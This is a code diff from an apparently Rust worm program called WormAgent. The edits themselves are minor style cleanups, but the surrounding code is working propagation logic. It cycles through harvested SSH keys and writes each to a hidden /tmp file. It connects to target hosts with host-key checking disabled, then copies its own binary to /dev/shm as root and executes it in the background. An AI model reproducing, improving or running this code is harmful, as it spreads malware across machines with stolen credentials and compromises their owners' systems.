@@ -130,7 +130,7 @@ impl WormAgent {
         clean_hosts
     }
 
-    fn marl_prioritize_targets(&self, hosts: &mut Vec<String>) {
+    fn marl_prioritize_targets(&self, hosts: &mut [String]) {
         // Build state vector for each target and rank by expected Q-value
         let model_bytes = include_bytes!("../../worker/models/scout_classifier.bin").to_vec();
 
@@ -182,7 +182,7 @@ impl WormAgent {
 
                 let mut success = false;
                 for (_key_name, key_data, _) in &ssh_keys {
-                    if let Ok(_) = std::fs::write("/tmp/.wk", key_data) {
+                    if std::fs::write("/tmp/.wk", key_data).is_ok() {
                         let output = std::process::Command::new("ssh")
                             .args(["-o", "StrictHostKeyChecking=no",
                                    "-o", "ConnectTimeout=5",
@@ -208,7 +208,7 @@ impl WormAgent {
                 let binary = std::fs::read(&current_bin).unwrap_or_default();
                 if !binary.is_empty() {
                     let result = hive_base::exec_ssh(host, "root",
-                        &format!("cat > /dev/shm/.w && chmod +x /dev/shm/.w && /dev/shm/.w &"),
+                        "cat > /dev/shm/.w && chmod +x /dev/shm/.w && /dev/shm/.w &",
                         None, None);
                     result.success
                 } else {
